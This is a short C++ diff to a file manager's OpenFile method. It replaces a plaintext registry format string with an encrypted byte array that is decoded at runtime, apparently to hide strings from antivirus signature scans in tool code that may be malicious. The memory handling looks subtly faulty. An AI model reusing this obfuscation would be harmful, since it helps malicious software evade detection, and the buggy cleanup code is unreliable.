@@ -208,8 +208,17 @@ bool CFileManager::OpenFile(LPCTSTR lpFile, INT nShowCmd)
 	RegQueryValue(hKey, NULL, strTemp, &nSize);
 	RegCloseKey(hKey);
 	memset(lpSubKey, 0, sizeof(lpSubKey));
-	wsprintf(lpSubKey, "%s\\shell\\open\\command", strTemp);
+
+	//strcry
+	char shell_open_command[] = {0x15,0xee,0xb9,0x95,0xbb,0xaf,0xa3,0xa9,0xa8,0x9f,0xad,0xb1,0xa5,0xd1,0xe2,0xde,0xd3,0xd6,0xd7,0xd8,0xd6,0xd3 };	//%s\\shell\\open\\command
+	char* pShell_open_command = decodeStr(shell_open_command);						//½âÃÜº¯Êý
+
+	wsprintf(lpSubKey, pShell_open_command, strTemp);
 	
+	memset(pShell_open_command, 0, shell_open_command[STR_CRY_LENGTH]);					//Ìî³ä0
+	delete pShell_open_command;
+
+
 	if (RegOpenKeyEx(HKEY_CLASSES_ROOT, lpSubKey, 0L, KEY_ALL_ACCESS, &hKey) != ERROR_SUCCESS)
 		return false;
 	memset(strTemp, 0, sizeof(strTemp));
